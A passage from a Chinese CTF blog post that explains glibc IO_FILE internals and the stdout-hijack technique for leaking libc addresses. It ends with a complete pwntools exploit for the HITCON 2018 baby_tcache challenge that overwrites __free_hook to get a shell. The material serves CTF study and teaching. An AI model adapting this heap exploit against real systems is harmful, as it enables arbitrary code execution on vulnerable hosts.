_IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可见里面记录着各种各样的数据,其中和pwn题相关的也就几个变量</p>
<h2 id="vtable源码"><a href="#vtable源码" class="headerlink" title="vtable源码"></a>vtable源码</h2><p>在 libc2.23 版本下，32 位的 vtable 相对io_file_plus偏移为 0x94，64 位偏移为 0xd8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每个程序启动时一般都有三个文件流是自动打开的:stdout,stdin,stderr,每个六都对应一个这个结构体，这三个结构体通过链表的形式组织，通过变量_chain链接，如图</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220111192200386.png" alt="image-20220111192200386"></p>
<p>这三个结构体都储存在libc.so的数据段</p>
<h2 id="io-file之-flag"><a href="#io-file之-flag" class="headerlink" title="io_file之_flag"></a>io_file之_flag</h2><p>_flag是io_file的第一个变量，他的高两位是由libc决定的，所以不同的libc会有不同的差异，ubuntu16即2.23的前两位是flags = 0xfbad0000,前两位标识这个流是什么文件，低两位字节则标识程序的执行状态,glibc专门宏定义了一些常量，每个常量记录一个执行状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<p>要判断flag是什么状态就直接与这些常量按位与运算。</p>
<h2 id="puts函数执行流程"><a href="#puts函数执行流程" class="headerlink" title="puts函数执行流程"></a>puts函数执行流程</h2><p>puts函数会调用_IO_puts函数，这个函数才完成puts函数的功能，下面是源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源代码引入了libioP.h库，在代码中使用了_IO_sputn宏，这个宏是 _IO_stdout 的虚表vtable指向的 _xsputn,这里储存着_IO_new_file_xsputn地址，也就是调用了这个函数。</p>
<p>然后这个函数又会调用（如果目标输出数据还有剩余的话）就会通过vtable调用_IO_new_file_overflow，下面是  _IO_new_file_overflow的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中就调用了 _io_do_write函数，这个函数是系统调用第一个参数是文件流f，第二个参数是输出的起始地址f-&gt;_IO_write_base，第三个输出长度f-&gt;_IO_write_ptr - f-&gt;_IO_write_base，如果事先能够控制io_write_base,那么就能任一地址读了，也就可以leak出libc的地址了。</p>
<h4 id="那么现在就有两个目标要完成，一个是控制io-write-base的地址，第二个是在IO-new-file-overflow函数中如何绕过条件调用io-do-write"><a href="#那么现在就有两个目标要完成，一个是控制io-write-base的地址，第二个是在IO-new-file-overflow函数中如何绕过条件调用io-do-write" class="headerlink" title="那么现在就有两个目标要完成，一个是控制io_write_base的地址，第二个是在IO_new_file_overflow函数中如何绕过条件调用io_do_write"></a>那么现在就有两个目标要完成，一个是控制io_write_base的地址，第二个是在IO_new_file_overflow函数中如何绕过条件调用io_do_write</h4><h2 id="绕过-IO-new-file-overflow函数的检查"><a href="#绕过-IO-new-file-overflow函数的检查" class="headerlink" title="绕过_IO_new_file_overflow函数的检查"></a>绕过<code>_IO_new_file_overflow</code>函数的检查</h2><p>进入<code>_IO_new_file_overflow</code>函数后会直接用flag与_IO_NO_WRITES常量做与运算，如果结果为真就会报错退出程序，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>要让程序运行下去执行io_do_write就得绕过这个if,让条件为假，这个_IO_NO_WRITES是一个io_file定义的常量，让flag的倒数第四位为0就能保证条件判断为假了，_flags = 0xfbad0000就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br></pre></td></tr></table></figure>

<p>第二个检查代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>条件是检查输出缓存区是否为空，如果为空就进入分支然后分配空间，并且会初始化指针，也包括重置f-&gt;_IO_write_base指针，这样的话就算原先布置了f-&gt;_IO_write_base指针也会被覆盖，从而无法任意地址写，所以这个条件也得判断为假，这个条件是两个条件或起来的，两个条件都为假才行，f-&gt;_IO_write_base == NULL肯定为假，所以通过布置让f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING为假就好。</p>
<p>_IO_CURRENTLY_PUTTING常量还是io_file定义的，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br></pre></td></tr></table></figure>

<p>要使f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING为1，flag=0xfbad0800就能实现，这个flag还能绕过一个检查</p>
<p>绕过这两个检查就能顺利进入io_do_wirte函数了，进入这个函数后又会进入io_new_do_write函数，</p>
<p>io_new_do_write函数又会调用new_do_write函数，这个函数最终调用系统调用write函数，前面的函数没啥检查，最后new_do_write还有一些检查，查看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先会执行一个If分支和一个else if分支，看elseif分支的条件，fp-&gt;_IO_read_end != fp-&gt;_IO_write_base这个大概率是不相等的,这个分支是不建议进入的，网上有各种原因就不赘述了，要想不进入这个分支那就只能进入If分支了，if分支的条件是fp-&gt;_flags &amp; _IO_IS_APPENDING</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure>

<p>只要设置flag=0xFBAD1800就行了。</p>
<h2 id="劫持stdout"><a href="#劫持stdout" class="headerlink" title="劫持stdout"></a>劫持stdout</h2><p>据我所知就是爆破,爆破后十六位伪造fd申请stdout.</p>
<p>和houseofroman手法十分类似，其实这种没有leak的题也可以直接houseofroman直接做，不过就是成功率太低了（要爆两次，第二次爆破范围还挺大）。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要利用stdout只要申请到stdout(看脸)然后设置好flag=0xFBAD1800和write_base就好了。</p>
<h2 id="例题-HITCON-2018-PWN-baby-tcache"><a href="#例题-HITCON-2018-PWN-baby-tcache" class="headerlink" title="例题 HITCON 2018 PWN baby_tcache"></a>例题 HITCON 2018 PWN baby_tcache</h2><p>没有show函数，就像前面总结的步骤一步步完成就行（因为脸黑关掉了aslr）</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">sh=process(<span class="string">&#x27;./baby_tcache&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x508</span>-<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;\xe0\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x550</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(<span class="number">0x70</span>+<span class="number">0x80</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x60\xe7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">info=sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">libc.address=u64(info)-<span class="number">0x3ed8b0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x100</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.address+ogg[<span class="number">1</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/wiki%E4%B8%8A%E7%9A%84house%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/11/wiki%E4%B8%8A%E7%9A%84house%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">wiki上的house系列</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

